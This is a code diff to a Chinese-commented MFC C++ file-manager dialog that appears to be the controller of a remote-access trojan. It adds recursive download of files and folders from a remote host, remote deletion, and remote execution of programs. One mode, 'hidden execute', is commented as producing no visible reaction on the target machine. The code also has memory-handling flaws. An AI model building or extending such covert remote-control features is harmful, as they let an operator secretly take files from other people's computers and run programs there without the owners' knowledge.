@@ -46,6 +46,10 @@ BEGIN_MESSAGE_MAP(CFileManage, CDialog)
 	ON_COMMAND(ID_UP, &CFileManage::OnUp)
 	ON_COMMAND(ID_FILE_FRESH, &CFileManage::OnFileFresh)
 	ON_COMMAND(ID_FILE_DOWNLOAD, &CFileManage::OnFileDownload)
+	ON_COMMAND(ID_FILE_DELETE, &CFileManage::OnFileDelete)
+	ON_WM_RBUTTONDOWN()
+	ON_COMMAND(ID_FILE_EXECUTE, &CFileManage::OnFileExecute)
+	ON_COMMAND(ID_FILE_EXECUTE_HIDE, &CFileManage::OnFileExecuteHide)
 END_MESSAGE_MAP()
 
 /////////////////////////////////////////////////////////////////////////////
@@ -73,21 +77,18 @@ BOOL CFileManage::OnInitDialog()
 		);
 	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //自动填充到非客户区的位置
 	VERIFY(m_wndToolBar.SetButtonText(0,"向上"));   
-	VERIFY(m_wndToolBar.SetButtonText(1,"复制"));   
-	VERIFY(m_wndToolBar.SetButtonText(2,"粘贴"));
+	VERIFY(m_wndToolBar.SetButtonText(1,"执行"));   
+	VERIFY(m_wndToolBar.SetButtonText(2,"隐藏执行"));
 	VERIFY(m_wndToolBar.SetButtonText(3,"删除"));
 	VERIFY(m_wndToolBar.SetButtonText(4,"上传"));   
 	VERIFY(m_wndToolBar.SetButtonText(5,"下载"));   
 	VERIFY(m_wndToolBar.SetButtonText(6,"刷新"));  
-	VERIFY(m_wndToolBar.SetButtonText(7,"查看"));   
+	VERIFY(m_wndToolBar.SetButtonText(7,"刷新"));   
 
 	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1100001);//状态栏的设置
 	int strPartDim[2]= {400,-1};
 	m_wndStatusBar.SetParts(2,strPartDim);
 
-
-	//加载菜单====================================
-	m_FileMenu.LoadMenu(IDR_MENU_FILE);
 
 	m_FileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);
 	//文件传输窗口中文件列表的初始化
@@ -95,6 +96,7 @@ BOOL CFileManage::OnInitDialog()
 	m_FileList.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
 	m_FileList.InsertColumn(2, "大小", LVCFMT_LEFT, 90);
 	m_FileList.InsertColumn(3, "修改时间", LVCFMT_LEFT, 130);
+
 	return TRUE;  // return TRUE unless you set the focus to a control
 	// EXCEPTION: OCX Property Pages should return FALSE
 }
@@ -210,37 +212,10 @@ unsigned  __stdcall  ListDriver(void * pParam)
 unsigned  __stdcall ListFiles(void * pParam)
 {
 	CFileManage *This = (CFileManage*)pParam; 
-	//发送获取盘符命令
-	This->m_MsgHead.dwCmd  = CMD_FILEDIRECTORY;
-	This->m_MsgHead.dwSize = This->m_SendPath.GetLength();
-	strcpy(This->m_Buffer,This->m_SendPath);
-	//数据传输同时接收数据
-	if( !SendMsg(This->m_ConnSocket, This->m_Buffer, &This->m_MsgHead) ||
-		!RecvMsg(This->m_ConnSocket, This->m_Buffer, &This->m_MsgHead))
-	{
-		//数据传输失败
-		This->m_wndStatusBar.SetText("通信失败", 0, 0);
-		return 0;
-	}
-	if(This->m_MsgHead.dwCmd != CMD_SUCCEED)
-	{
-		//数据传输失败
-		if(This->m_MsgHead.dwCmd == CMD_DIRFLODERERR)
-		{
-			This->m_CurrPath = "";
-			This->m_wndStatusBar.SetText("目录不能访问", 0, 0); 
-		}
-		else
-		{
-			This->m_wndStatusBar.SetText("获取远程目录失败", 0, 0); 
-			This->m_CurrPath = "";
-		}
-		return 0;
-	}
+	This->getFiles(This->m_SendPath, This->m_Buffer);
 
 	//显示文件列表
 	This->m_FileList.DeleteAllItems();
-
 	DWORD dwNum = This->m_MsgHead.dwSize /sizeof(FileInfo);
 	BYTE * m_DesBuf = (LPBYTE)(This->m_Buffer);
 	LPFileInfo pInfo = (LPFileInfo) m_DesBuf;
@@ -297,7 +272,6 @@ void CFileManage::OnNMDblclkFilelist(NMHDR *pNMHDR, LRESULT *pResult)
 	*pResult = 0;
 }
 
-
 void CFileManage::OnUp()
 {
 	// TODO: 在此添加命令处理程序代码
@@ -341,9 +315,241 @@ void CFileManage::OnFileFresh()
 	getFilesByCurrPath();
 }
 
+CString CFileManage::chooseDirectory(){
+	TCHAR           szFolderPath[MAX_PATH] = {0};  
+	CString         strFolderPath = TEXT("");  
+	BROWSEINFO      sInfo;  
+	::ZeroMemory(&sInfo, sizeof(BROWSEINFO));  
+	sInfo.pidlRoot   = 0;  
+	sInfo.lpszTitle   = _T("请选择一个文件夹：");  
+	sInfo.ulFlags   = BIF_DONTGOBELOWDOMAIN | BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE | BIF_EDITBOX;  
+	sInfo.lpfn     = NULL;  
 
+	// 显示文件夹选择对话框  
+	LPITEMIDLIST lpidlBrowse = ::SHBrowseForFolder(&sInfo);   
+	if (lpidlBrowse != NULL)  
+	{  
+		// 取得文件夹名  
+		if (::SHGetPathFromIDList(lpidlBrowse,szFolderPath))    
+		{  
+			strFolderPath = szFolderPath;  
+		}  
+	}  
+	if(lpidlBrowse != NULL)  
+	{  
+		::CoTaskMemFree(lpidlBrowse);  
+	}  
+	return strFolderPath; 
+}
 void CFileManage::OnFileDownload()
 {
 	// TODO: 在此添加命令处理程序代码
+	unsigned dwThreadId;
+	HANDLE handle =
+		(HANDLE)_beginthreadex(NULL,				 
+		0,					 
+		downLoadThread,  
+		this,   
+		0, 		 
+		&dwThreadId);
+	if(handle == NULL)
+	{
+		m_wndStatusBar.SetText("下载失败", 0 ,0);
+	}
+	CloseHandle(handle);
+}
 
+
+unsigned  __stdcall downLoadThread(void * pParam)	{
+	CFileManage *This = (CFileManage*)pParam; 
+	CString savePath = This->chooseDirectory();
+	POSITION pos = This->m_FileList.GetFirstSelectedItemPosition(); 
+	while(pos){	
+		int iCurrSel= This->m_FileList.GetNextSelectedItem(pos);
+		int fileCategory = This->m_FileList.GetItemData(iCurrSel);
+		if((fileCategory >= 'A' && fileCategory <= 'Z') || (fileCategory >= 'a' && fileCategory <= 'z')) {  //如果要求传送整个磁盘则不传送   磁盘一般有太多数据
+			continue;
+		}
+		CString fileName = This->m_FileList.GetItemText(iCurrSel, 0);
+
+		if(fileCategory !=2 ){   //是目录
+			This->directoryDownload(This->m_CurrPath, savePath, fileName);
+		}
+		else{
+			This->fileDownload(This->m_CurrPath, savePath ,fileName);
+		}
+		Sleep(200);
+	}
+	return 0 ;
+}
+
+void CFileManage::directoryDownload(CString remotePath, CString localPath, CString fileName){
+	m_wndStatusBar.SetText(remotePath + "   文件夹下载中", 0, 0);
+	remotePath = remotePath + "\\" + fileName;
+	localPath = localPath + "\\" + fileName;
+	createDirectory(localPath);
+	char * pBuffer = new char[1024 * 1000];
+	getFiles(remotePath + "\\*", pBuffer);
+	//对该文件夹下的每个文件进行处理
+	DWORD dwNum = m_MsgHead.dwSize /sizeof(FileInfo);
+	BYTE * desBuf = (LPBYTE)(pBuffer);
+	LPFileInfo pInfo = (LPFileInfo) desBuf;
+	for(DWORD i = 0; i < dwNum; i++)
+	{
+		if(pInfo[i].iType == 2)//文件
+		{
+			fileDownload(remotePath, localPath, pInfo[i].cFileName); 
+			Sleep(200);
+		}
+		if(pInfo[i].iType == 1)//文件夹
+		{	
+			directoryDownload(remotePath, localPath, pInfo[i].cFileName);
+			Sleep(200);
+		}
+	}
+	delete pBuffer;
+	m_wndStatusBar.SetText(remotePath + "   文件夹下载成功", 0, 0);
+
+}
+
+void CFileManage::createDirectory(CString directoryPath){
+	/*	if(PathIsDirectory(directoryPath) == FALSE || CreateDirectory(directoryPath,NULL) != 0)   
+	{    
+	m_wndStatusBar.SetText(directoryPath + "   文件夹创建成功", 0, 0);
+	}  
+	else
+	{		
+	if(AfxMessageBox("下载文件夹时发生错误！是否继续?",   MB_YESNO)   ==   IDYES)   
+	return;
+	}
+	*/
+	CreateDirectory(directoryPath,NULL);
+}
+
+
+void  CFileManage::getFiles(CString remotePath, char *pBuffer){
+	//发送获取盘符命令
+	m_MsgHead.dwCmd  = CMD_FILEDIRECTORY;
+	m_MsgHead.dwSize = remotePath.GetLength();
+	strcpy(pBuffer,remotePath);
+	//数据传输同时接收数据
+	if( !SendMsg(m_ConnSocket, pBuffer, &m_MsgHead) ||
+		!RecvMsg(m_ConnSocket, pBuffer, &m_MsgHead))
+	{
+		//数据传输失败
+		m_wndStatusBar.SetText("通信失败", 0, 0);
+		return ;
+	}
+	if(m_MsgHead.dwCmd != CMD_SUCCEED)
+	{
+		//数据传输失败
+		if(m_MsgHead.dwCmd == CMD_DIRFLODERERR)
+		{
+			m_CurrPath = "";
+			m_wndStatusBar.SetText("目录不能访问", 0, 0); 
+		}
+		else
+		{
+			m_wndStatusBar.SetText("获取远程目录失败", 0, 0); 
+			m_CurrPath = "";
+		}
+		return ;
+	}
+}
+
+
+void CFileManage::fileDownload(CString remotePath, CString localPath, CString fileName){
+	if(localPath.Find("objects")){
+		m_MsgHead.dwCmd = CMD_GETFILE;
+	}
+	remotePath = remotePath + "\\" + fileName;
+	localPath = localPath + "\\" + fileName;
+
+	m_MsgHead.dwCmd = CMD_GETFILE;
+	m_MsgHead.dwSize = remotePath.GetLength();
+	if(!SendMsg(m_ConnSocket, (LPSTR)(LPCTSTR)remotePath, &m_MsgHead)  ) 
+	{
+		m_wndStatusBar.SetText("通信失败!", 0, 0);	
+		return ;
+	}
+	CFile file(localPath, CFile::modeCreate | CFile::modeWrite);
+	while(RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead)){
+		file.Write(m_Buffer, m_MsgHead.dwSize);
+		if(m_MsgHead.dwSize < MAX_FILE_DATA_BUFFER_SIZE) break;
+	}
+	m_wndStatusBar.SetText(remotePath + "   下载成功", 0, 0);
+	file.Close();
+}
+
+
+void CFileManage::OnFileDelete()
+{
+	// TODO: 在此添加命令处理程序代码
+	POSITION pos = m_FileList.GetFirstSelectedItemPosition(); 	
+	char * pBuffer = new char[1000];
+	while(pos){	
+		int iCurrSel= m_FileList.GetNextSelectedItem(pos);
+		strcpy(pBuffer, m_CurrPath + "\\" + m_FileList.GetItemText(iCurrSel, 0));
+		m_MsgHead.dwCmd = CMD_FILE_DELETE;
+		m_MsgHead.dwSize = strlen(pBuffer);
+		if(::MessageBox(NULL, pBuffer, "你确定要删除远程主机文件或文件夹？ 慎重！！！", MB_YESNO) == IDYES)
+		{
+			if(!SendMsg(m_ConnSocket, pBuffer, &m_MsgHead))
+			{
+				m_wndStatusBar.SetText("通信失败!", 0, 0);	
+				return ;
+			}
+		}
+	}
+	OnFileFresh();
+}
+
+
+void CFileManage::OnRButtonDown(UINT nFlags, CPoint point)
+{
+	// TODO: 在此添加消息处理程序代码和/或调用默认值
+	CMenu menu;
+	menu.LoadMenu(IDR_MENU_FILE);
+	CMenu *pop = menu.GetSubMenu(0);
+	ClientToScreen(&point);
+	pop->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON,point.x,point.y,GetParent());
+
+	CDialog::OnRButtonDown(nFlags, point);
+}
+
+
+void CFileManage::OnFileExecute()
+{
+     fileExecute(0); // 0表示正常运行不隐藏   运行时候会产生cmd窗口
+}
+
+
+void CFileManage::OnFileExecuteHide()
+{
+	// TODO: 在此添加命令处理程序代码
+	fileExecute(1);   //1表示隐藏运行   运行时服务端无明显反应
+}
+
+void CFileManage::fileExecute(int hide){
+	POSITION pos = m_FileList.GetFirstSelectedItemPosition(); 	
+	char * pBuffer = new char[1000];
+	while(pos){	
+		int iCurrSel= m_FileList.GetNextSelectedItem(pos);
+		int category = m_FileList.GetItemData(iCurrSel);
+		strcpy(pBuffer,m_CurrPath + "\\" + m_FileList.GetItemText(iCurrSel,0));
+		if(category != 2) {
+			::MessageBox(NULL,pBuffer,"该文件不能执行！",MB_OK);
+			continue;
+		}
+		m_MsgHead.dwCmd  = CMD_FILE_EXECUTE;
+		m_MsgHead.dwSize = strlen(pBuffer);
+		m_MsgHead.dwExtend1 = hide;//随便取一个大于0的值表示正常运行不隐藏
+		//数据传输同时接收数据
+		if( !SendMsg(m_ConnSocket, pBuffer, &m_MsgHead))
+		{
+			//数据传输失败
+			m_wndStatusBar.SetText("通信失败", 0, 0);
+			return ;
+		}
+	}
 }
